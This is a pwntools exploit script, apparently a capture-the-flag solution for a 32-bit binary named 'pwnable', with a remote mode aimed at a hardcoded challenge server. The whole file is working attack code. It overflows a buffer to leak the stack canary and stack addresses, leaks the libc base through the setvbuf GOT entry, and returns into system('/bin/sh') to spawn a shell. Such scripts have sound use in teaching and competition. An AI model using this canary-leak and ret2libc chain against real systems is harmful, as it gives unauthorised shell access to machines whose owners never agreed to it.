#!/usr/bin/env python
from pwn import *

context.terminal = ['tmux', 'split-window', '-h']
context.log_level = ['debug', 'info', 'warn'][0]

BINARY = './warmup-dist/pwnable'

r = tube; elf = ELF; libc = ELF  # noqa trick JEDI 
# prompt = '> '  # heap

PRINT = 0x080485D0
MAIN = 0x08048400

def dbg(bps = None, symbols = None):
    script = ''
    if bps:
        for bp in bps:
            script += 'b *{}\n'.format(bp)
    if symbols:
        for k in symbols:
            script += 'set {}={}\n'.format(k, symbols[k])
    gdb.attach(r, script)

def exploit(REMOTE):
    # dbg(bps, symbols)

    payload = 'A' * 0x21
    r.sendline(payload)
    r.recvn(0x20)
    canary = u32(r.recvn(0x4)) & 0xFFFFFF00
    info(hex(canary))
    r.recvline()

    payload = 'A' * 0x28
    r.sendline(payload)
    r.recvn(0x28)
    stack1 = u32(r.recvn(0x4))
    stack2 = u32(r.recvn(0x4))
    info(hex(stack1))
    info(hex(stack2))
    r.recvline()

    payload = 'A' * 0x20
    payload += p32(canary)
    payload += p32(canary)
    payload += p32(stack1)
    payload += p32(stack2 - 0x20)
    payload += p32(PRINT)
    payload += p32(MAIN)
    payload += p32(elf.got['setvbuf'])
    r.sendline(payload)
    r.recv()

    r.sendline('break')

    setvbuf = u32(r.recvn(4))
    info(hex(setvbuf))
    libc.address = setvbuf - libc.symbols['setvbuf']
    info(hex(libc.address))

    payload = 'A' * 0x20
    payload += p32(canary)
    payload += p32(canary)
    payload += p32(stack1)
    payload += p32(stack2 - 0x30)
    payload += p32(libc.symbols['system'])
    payload += p32(MAIN)
    payload += p32(next(libc.search('/bin/sh')))
    r.sendline(payload)

    r.sendline('break')


if __name__ == '__main__':
    REMOTE = os.getenv('REMOTE')
    HOST = '13.233.66.116'
    PORT = 7000

    elf = ELF(BINARY, checksec=False)
    bps = [0x08048499]
    symbols = {}

    if REMOTE:
        r = remote(HOST, PORT)
        libc = ELF('./warmup-dist/libc-2.23.so', checksec=False)
    else:
        r = elf.process(aslr=False)
        libc = ELF('/usr/lib32/libc.so.6', checksec=False)

    exploit(REMOTE)
    r.interactive()
